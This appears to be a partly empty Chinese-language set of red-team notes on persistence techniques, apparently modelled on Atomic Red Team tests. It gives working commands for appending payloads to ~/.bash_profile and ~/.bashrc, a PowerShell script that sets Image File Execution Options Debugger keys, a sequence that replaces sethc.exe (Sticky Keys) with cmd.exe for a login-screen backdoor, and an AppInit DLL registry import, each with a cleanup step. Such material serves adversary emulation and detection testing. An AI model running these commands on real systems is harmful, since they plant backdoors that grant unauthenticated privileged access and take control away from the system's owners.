# 001
# 002
# 003
# 004-.bash_profile和.bashrc
> ### 基础  
> /etc/profile: 此文件为系统的每个用户设置环境信息,当用户第一次登录时,该文件被执行.并从/etc/profile.d目录的配置文件中搜集shell的设置.  
> /etc/bashrc:  为每一个运行bash shell的用户执行此文件.当bash shell被打开时,该文件被读取.  
> ~/.bash_profile: 每个用户都可使用该文件输入专用于自己使用的shell信息,当用户登录时,该文件仅仅执行一次!默认情况下,他设置一些环境变量,执行用户的.bashrc文件.  
> ~/.bashrc: 该文件包含专用于你的bash shell的bash信息,当登录时以及每次打开新的shell时,该该文件被读取.  
> ~/.bash_logout: 当每次退出系统(退出bash shell)时,执行该文件.  
> ### 利用(linux/macOS)
> ```bash 
> echo "#{command}" >> ~/.bash_profile  
> echo "#{command}" >> ~/.bashrc```
# 005

# 006
# 007
# 008-辅助功能
> ### 基础  
> 攻击者可以通过执行可访问性功能触发的恶意内容来建立持久性和/或提升特权。Windows包含可访问性功能，这些功能可以在用户登录之前通过组合键启动（例如：当用户在Windows登录屏幕上时）。攻击者可以修改这些程序的启动方式，以获取命令提示符或后门程序，而无需登录系统。
两个常见的可访问性程序分别是：C:\Windows\System32\sethc.exe在按住shift键五次C:\Windows\System32\utilman.exe时启动；以及在按下Windows + U组合键时启动。sethc.exe程序通常称为“粘滞键”，并且已被攻击者用于通过远程桌面登录屏幕进行未经身份验证的访问。（引文：FireEye Hikit Rootkit） 
> ### 利用(windows)
> 1.附属程序作为调试到潜在程序  
> powershell脚本如下:(parent_list/attached_process)
> ```powershell
$input_table = "#{parent_list}".split(",")
$Name = "Debugger"
$Value = "#{attached_process}"
Foreach ($item in $input_table){
  $item = $item.trim()
  $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$item"
  IF(!(Test-Path $registryPath))
  {
    New-Item -Path $registryPath -Force
    New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force
  }
  ELSE
  {
    New-ItemProperty -Path $registryPath -Name $name -Value $Value
  }
}
> ```
> 清除脚本:  
> ```powershell
$input_table = "#{parent_list}".split(",")
Foreach ($item in $input_table)
{
  $item = $item.trim()
  reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$item" /v Debugger /f 2>&1 | Out-Null
}
> ```
> 2.粘滞建替换  
> 命令：  
> ```powershell
copy C:\Windows\System32\sethc.exe C:\Windows\System32\sethc_backup.exe
takeown /F C:\Windows\System32\sethc.exe /A
icacls C:\Windows\System32\sethc.exe /grant Administrators:F /t
copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
> ```
> 清除：
> ```powershell
copy /Y C:\Windows\System32\sethc_backup.exe C:\Windows\System32\sethc.exe
> ```
# 009-AppCertDLL
### 
# 010-AppInit DLL
> ### 基础  
> AppInit_DLLs是一种机制，它允许将任意DLL列表加载到系统上的每个用户模式进程中。成功执行后，您将看到消息“操作成功完成”。每次加载DLL时，您都会看到一个消息框，其中显示一条消息：“安装AppInit Shim DLL被调用！”。出现。当您的计算机启动各种应用程序时，这会定期发生，并且实际上可能使您发疯。使消息框出现并验证AppInit DLL正在加载的一种可靠方法是启动记事本应用程序。确保以后再运行清理命令，以免出现消息框
> ### 利用
> 命令：
> ```powershell
reg.exe import #{registry_file}
> ```
> 清除：
> ```powershell
reg.exe import #{registry_cleanup_file} >nul 2>&1
> ```
# 011
# 012
# 013
# 014
# 015